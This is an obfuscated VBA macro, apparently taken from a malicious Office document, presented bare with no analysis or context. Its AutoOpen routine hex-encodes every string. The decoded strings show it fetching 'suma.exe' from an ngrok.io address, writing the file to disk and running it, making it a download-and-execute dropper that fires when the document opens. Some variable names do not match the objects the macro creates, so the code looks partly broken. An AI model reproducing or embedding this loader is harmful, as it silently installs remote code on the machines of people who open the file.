
Sub AutoOpen()
Dim gaetyihzjfa
Dim bgxvdjdagzpb
Dim xhlhyffgcwaddmskdhg
Set gaetyihzjfa = CreateObject(aqrumjrsprqi("4d6963726f") & aqrumjrsprqi("736f66742e584d4c48545450"))
Set bgxvdjdagzpb = CreateObject(aqrumjrsprqi("41") & aqrumjrsprqi("444f44422e53747265616d"))
Set xhlhyffgcwaddmskdhg = CreateObject(aqrumjrsprqi("57536372697074") & aqrumjrsprqi("2e5368656c6c"))
URL = aqrumjrsprqi("687474703a2f2f6265386339663237343265322e6e67726f6b2e696f2f6578616d706c652f73756d61") & aqrumjrsprqi("2e657865") 
FileName = aqrumjrsprqi("73756d612e6578") & aqrumjrsprqi("65") 
RUNCMD = aqrumjrsprqi("73") & aqrumjrsprqi("756d612e657865") 
http_obj.Open aqrumjrsprqi("474554"), URL, False
http_obj.Send
stream_obj.Type = 1
stream_obj.Open
stream_obj.write gaetyihzjfa.responseBody
stream_obj.savetofile FileName, 2
shell_obj.Run RUNCMD
End SubPrivate Function aqrumjrsprqi(ByVal gdbwqrqfript ) 
Dim kkeonzktrfpi 
For kkeonzktrfpi = 1 To Len(gdbwqrqfript) Step 2
aqrumjrsprqi = aqrumjrsprqi & Chr(CInt("&H" & Mid(gdbwqrqfript, kkeonzktrfpi, 2)))
Next '//kkeonzktrfpi
End Function

AutoOpen
